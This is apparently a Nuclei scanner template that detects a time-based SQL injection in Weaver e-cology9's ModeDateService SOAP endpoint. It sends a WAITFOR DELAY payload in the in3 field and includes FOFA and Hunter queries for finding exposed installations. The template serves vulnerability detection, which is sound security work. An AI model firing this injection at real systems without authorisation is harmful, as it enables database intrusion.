tmp/sql/ecology-v9-modedateservice-sqli.yaml

id: ecology-v9-modedateservice-sqli

info:
  name: Weaver e-cology9 ModeDateService SQL Injection
  author: Co5mos
  severity: high
  description: |
    Weaver e-cology9 ModeDateService interface is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL commands.
  reference:
    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEecology9%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3ModeDateService%E5%AD%98%E5%9C%A8SQL%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: 'app="泛微-协同商务系统"'
    hunter-query: 'app.name=="泛微 e-cology 9.0 OA"'
  tags: weaver, sqli, ecology

http:
  - raw:
      - |
        @timeout: 20s
        POST /services/ModeDateService HTTP/1.1
        Host: {{Hostname}}

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mod="http://localhost/services/ModeDateService">
           <soapenv:Header/>   
           <soapenv:Body>
              <mod:getAllModeDataCount>
        		<mod:in0>1</mod:in0>         
        		<mod:in1>1</mod:in1>         
        		<mod:in2>1=1</mod:in2>         
        		<mod:in3>1';WAITFOR DELAY '0:0:5'--</mod:in3>
        	  </mod:getAllModeDataCount>
          </soapenv:Body>
        </soapenv:Envelope>

      - |
        @timeout: 20s
        POST /services/ModeDateService HTTP/1.1
        Host: {{Hostname}}

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mod="http://localhost/services/ModeDateService">
           <soapenv:Header/>   
           <soapenv:Body>
              <mod:getAllModeDataCount>
        		<mod:in0>1</mod:in0>         
        		<mod:in1>1</mod:in1>         
        		<mod:in2>1=1</mod:in2>         
        		<mod:in3>1';WAITFOR DELAY '0:0:0'--</mod:in3>
        	  </mod:getAllModeDataCount>
          </soapenv:Body>
        </soapenv:Envelope>

    matchers:
      - type: dsl
        dsl:
          - duration_1 >= 5 && duration_1 < 10
          - duration_2 < 5
        condition: and
